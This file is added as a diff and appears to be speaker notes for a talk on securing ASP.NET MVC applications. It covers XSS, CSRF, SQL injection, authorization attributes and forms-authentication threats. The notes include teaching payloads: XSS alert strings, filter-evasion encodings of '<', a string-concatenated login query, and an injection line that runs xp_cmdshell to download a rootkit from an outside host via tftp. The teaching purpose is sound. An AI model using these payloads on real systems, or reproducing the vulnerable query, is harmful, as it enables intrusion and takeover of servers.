@@ -1,0 +1,151 @@
+***Always give the presentation you'd want to attend***
+
+Resources 
+
+MVC cheat sheet
+Checklist for Secure Code from "Writing Secure Code" book.
+
+Lack of input validation
+Weak authentication
+Weak access control
+Improper use of cryptography
+<script>alert(‘If you see this, XSS is possible’);</script>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+security misconfig - directory listing or server update, 
+Samy worm
+
+Ways you can represent “<“?
+<
+%3C
+&lt
+&lt;
+&LT
+&LT;
+&#60
+&#060
+&#60;
+&#060;
+&#x3c
+&#x03c
+&#x3c;
+&#x03c;
+\x3c
+\x3C
+\u003c
+\u003C
+
+
+Difference between Hashing and Encryption?
+Exposure of errors such as custom errors, IIS versions, stack trace.
+Secure cookie 
+HTTP Only cookie <httpCookies  httpOnlyCookies="true" requireSSL="true" />
+web.config issues
+hidden fields and model posting
+Web Application Firewalls
+Web farms DoS and DDoS
+Static Code Analysis - AppScan
+SSO
+Evercookie
+Rainbow Attack
+Salting Hash
+Phishing attacks with redirection
+DoS and CAPTCHA
+Nonce
+Redirection attacks
+secure cookies (with redirection attack) - httponly
+PopQuiz
+Echo is bad
+web sand boxes
+DoS and CAPTCHA
+the application uses untrusted data in construction of the HTML
+direct access to user or file
+CSRF - example.com/transferfunds?amount=123123&account=1213
+<img src=sajdlasjdl>
+[ValidateAntiForgeryToken]
+<%=Html.AntiForgeryToken%>
+
+Definitions
+Vulnerabilities : Weaknesses that provide an advantage to a threat
+
+scenario driven
+
+Multiple layers discussion
+
+OWASP membership
+
+Educating developers about info-sec
+
+
+SELECT ProductID, UnitPrice, ProductName from Product WHERE UnitPrice > 500 ORDER BY UnitPrice DESC
+
+Is this your grandfather's attack, think again.
+
+SQL injection attack demo from impervia - Havej - DOS using recepies website
+
+Stanford Presentation on Multi-Factor authentication
+
+Security cannot be sprayed on; at scale
+
+string sql = "SELECT * FROM Accounts WHERE AccountNumber = '" + AccountTextBox.Text + "' AND Password = '" + PasswordTextBox.Text + "'";
+SqlCommand qry = new SqlCommand( sql, con );
+con.Open();
+SqlDataReaderrdr = qry.ExecuteReader();
+"SELECT * FROM Accounts WHERE AccountNumber = '" +     12345’-- + "' AND Password = '" + 
+"SELECT * FROM Accounts WHERE AccountNumber = '" +     bob’; xp_cmdshell(‘tftp –I 10.10.10.10 GET    my_rootkit.exe’); -- 
+
+Denial of service 
+
+
+Authorize attribute usage
+
+Change password
+http://localhost:59586/Account/ChangePassword
+    [Authorize(Roles = "Admin, Super User")]
+
+When you mark an action method with AuthorizeAttribute, access to that action method is restricted to users who are both authenticated and authorized. If you mark a controller with the attribute, all action methods in the controller are restricted.
+
+The Authorize attribute lets you indicate that authorization is restricted to predefined roles or to individual users. This gives you a high degree of control over who is authorized to view any page on the site.
+
+If an unauthorized user tries to access a method that is marked with the Authorize attribute, the MVC framework returns a 401 HTTP status code. If the site is configured to use ASP.NET forms authentication, the 401 status code causes the browser to redirect the user to the login page.
+
+OK for toy apps, how to do it on the real apps?
+
+Global filters
+
+http://blogs.msdn.com/b/rickandy/archive/2011/05/02/securing-your-asp-net-mvc-3-application.aspx
+
+
+public static void RegisterGlobalFilters(GlobalFilterCollection filters) {
+    filters.Add(new LogonAuthorize());
+    filters.Add(new RequireHttpsAttribute()); 
+    filters.Add(new HandleErrorAttribute());
+}
+
+
+Failing to properly protect forms authentication is a common vulnerability that can lead to the following:
+
+
+public static void RegisterGlobalFilters(GlobalFilterCollection filters) {
+    filters.Add(new LogonAuthorize());
+    filters.Add(new RequireHttpsAttribute()); 
+    filters.Add(new HandleErrorAttribute());
+}
+
+Elevation of privileges. An attacker could elevate privileges within your application by updating the user name or the list of roles contained in the ticket prior to posting it back to the server. An attacker who can upload malicious code to your application can also successfully create and modify the form’s authentication tickets.
+Session hijacking. An attacker could capture another user's authentication ticket and use it to access your application. There are a number of ways that this could happen:
+As a result of a cross-site scripting vulnerability.
+If the transport is not being protected using a security mechanism such as Secure Sockets Layer (SSL).
+If the ticket is stored in the browser cache.
+Session usage after sign-out. Even after the user has logged out of the application and the application has called FormsAuthentication.SignOut, the authentication ticket remains valid until its time-to-live (TTL) expires, so it can be used by an attacker to impersonate another user.
+Eavesdropping. An attacker could look inside a form’s authentication ticket to obtain any sensitive information it contains and use this information to compromise your application.
+Compromise of the user identity store. An attacker with access to the user identity store may obtain access to user names and passwords, either directly from the data store or by using a SQL injection attack.
+To protect against these threats, you can apply the RequireHttpsAttribute  to the global filters collection in the global.asax file.
+
+
+
+------------------
+Importance of Validation
+All input should be considered potentially malicious until proven otherwise.
+Returning 1000 records for a logon event is not normal.
+Over-Posting Model Data
+------------------
